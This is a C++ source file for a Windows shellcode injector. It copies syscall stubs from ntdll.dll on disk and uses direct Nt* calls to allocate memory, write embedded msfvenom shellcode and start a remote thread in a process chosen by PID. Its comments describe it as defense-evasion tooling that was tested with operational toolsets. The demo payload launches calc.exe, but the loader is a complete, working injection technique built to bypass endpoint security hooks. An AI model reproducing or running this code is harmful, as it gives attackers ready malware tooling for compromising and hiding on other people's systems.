
#include <Windows.h>
#include <iostream>

#include "structs.h"
#define STATUS_SUCCESS 0

/* The code for : RVAtoRawOffset, MapSyscall, EstablishSyscalls is mostly from https://www.ired.team/offensive-security/defense-evasion/retrieving-ntdll-syscall-stubs-at-run-time
	
	In testing we ran into some odd issues with msfvenom payloads that were encoded.  Didn't bother to dig into it, works fine with various operational toolsets that we tested
*/

// msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe EXITFUNC=thread -f c 
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";


int const SYSCALL_STUB_SIZE = 21;

MyNtOpenProcess _NtOpenProcess = NULL;
char OpenProcStub[SYSCALL_STUB_SIZE] = {};

MyNtAllocateVirtualMemory _NtAllocateVirtualMemory = NULL;
char AllocStub[SYSCALL_STUB_SIZE] = {};

MyNtWriteVirtualMemory _NtWriteVirtualMemory = NULL;
char WVMStub[SYSCALL_STUB_SIZE] = {};

MyNtProtectVirtualMemory _NtProtectVirtualMemory = NULL;
char ProtectStub[SYSCALL_STUB_SIZE] = {};

MyNtCreateThreadEx _NtCreateThreadEx = NULL;
char CreateThreadExStub[SYSCALL_STUB_SIZE];

PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
	return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

BOOL MapSyscall(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
{
	PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);

	for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
	{
		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
		if (strcmp(functionNameResolved, functionName) == 0)
		{
			memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
			return TRUE;
		}
	}

	return FALSE;
}


BOOL FindOpenProc(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtOpenProcess = (MyNtOpenProcess)(LPVOID)OpenProcStub;
	BOOL status = VirtualProtect(OpenProcStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
	if (MapSyscall("NtOpenProcess", exportDirectory, fileData, textSection, rdataSection, OpenProcStub))
	{
		return TRUE;
	}

	return FALSE;
}
HANDLE CallOpenProc(DWORD pid)
{
	// variables for NtOpenProcess
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES zoa;
	InitializeObjectAttributes(&zoa, NULL, NULL, NULL, NULL, NULL);
	CLIENT_ID targetPid = { 0 };
	targetPid.UniqueProcess = (void*)pid;
	NTSTATUS success = NULL;
	success = _NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &zoa, &targetPid);
	if (success != 0)
		return NULL;

	return hProcess;
}
BOOL FindAlloc(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtAllocateVirtualMemory = (MyNtAllocateVirtualMemory)(LPVOID)AllocStub;
	VirtualProtect(AllocStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall("NtAllocateVirtualMemory", exportDirectory, fileData, textSection, rdataSection, AllocStub))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL FindWriteVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtWriteVirtualMemory = (MyNtWriteVirtualMemory)(LPVOID)WVMStub;
	VirtualProtect(WVMStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall("NtWriteVirtualMemory", exportDirectory, fileData, textSection, rdataSection, WVMStub))
	{
		return TRUE;
	}
	return FALSE;
}
BOOL FindProtectVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{

	DWORD oldProtection;
	_NtProtectVirtualMemory = (MyNtProtectVirtualMemory)(LPVOID)ProtectStub;
	VirtualProtect(ProtectStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall("NtProtectVirtualMemory", exportDirectory, fileData, textSection, rdataSection, ProtectStub))
	{
		return TRUE;
	}
	return FALSE;
}


BOOL FindCreateThreadEx(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtCreateThreadEx = (MyNtCreateThreadEx)(LPVOID)CreateThreadExStub;
	VirtualProtect(CreateThreadExStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall("NtCreateThreadEx", exportDirectory, fileData, textSection, rdataSection, CreateThreadExStub))
	{
		return TRUE;
	}

	return FALSE;
}


BOOL EstablishSyscalls()
{
	LPVOID fileData = NULL;
	HANDLE file = NULL;
	DWORD fileSize = NULL;
	DWORD bytesRead = NULL;
	BOOL success = TRUE;

	file = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	fileSize = GetFileSize(file, NULL);
	fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
	if (!ReadFile(file, fileData, fileSize, &bytesRead, NULL))
		return FALSE;

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
	DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
	PIMAGE_SECTION_HEADER textSection = section;
	PIMAGE_SECTION_HEADER rdataSection = section;

	for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		if (strcmp((CHAR*)section->Name, (CHAR*)".rdata") == 0) {
			rdataSection = section;
			break;
		}
		section++;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

	// Assign Syscall values
	if (!FindOpenProc(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindAlloc(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindWriteVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindProtectVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindCreateThreadEx(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;


	if (file)
	{
		CloseHandle(file);
		file = NULL;
	}

	if (success)
		return TRUE;

	return FALSE;

}

int main(int argc, char* argv[])
{
	HANDLE hProc = INVALID_HANDLE_VALUE;
	HANDLE hRemoteThread = INVALID_HANDLE_VALUE;
	LPVOID lpAllocationStart = nullptr;
	SIZE_T szAllocation = sizeof shellcode;
	DWORD oldProtect;

	//DWORD targetPid = 14948;

	
	if (argc < 2)
	{
		printf("Enter target PID");
		return 1;

	} 

	DWORD targetPid = std::atoi(argv[1]);

	if (!EstablishSyscalls())
		return 1;



	printf("Opening target process with PID %d\n", targetPid);
	hProc = CallOpenProc(targetPid);
	if (hProc == INVALID_HANDLE_VALUE) {
		printf("Failed to open target process\n");
		return FALSE;
	}

	printf("Allocating %d bytes\n", szAllocation);
	NTSTATUS status = _NtAllocateVirtualMemory(hProc, &lpAllocationStart, 0, &szAllocation, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS)
	{
		printf("Failed to allocate memory\n");
		return FALSE;
	}

	printf("Writing shellcode to 0x%p\n", lpAllocationStart);
	status = _NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)shellcode, szAllocation, NULL);
	if (status != STATUS_SUCCESS)
	{
		printf("Failed to write to allocated memory\n");
		return FALSE;
	}

	printf("Changing memory permissions\n");
	status = _NtProtectVirtualMemory(hProc, &lpAllocationStart, &szAllocation, PAGE_EXECUTE_READ, &oldProtect);
	if (status != STATUS_SUCCESS)
	{
		printf("Unable to change memory permissions\n");
		return FALSE;
	}

	printf("Creating remote thread\n");
	status = _NtCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProc,
		(LPTHREAD_START_ROUTINE)lpAllocationStart, NULL, FALSE, 0, 0, 0, NULL);


	if (hRemoteThread)
		CloseHandle(hRemoteThread);
	if (hProc)
		CloseHandle(hProc);

	if (status != STATUS_SUCCESS)
	{
		printf("CreateRemoteThread failed\n");
		return FALSE;
	}


	printf("Success!");
	return 0;
}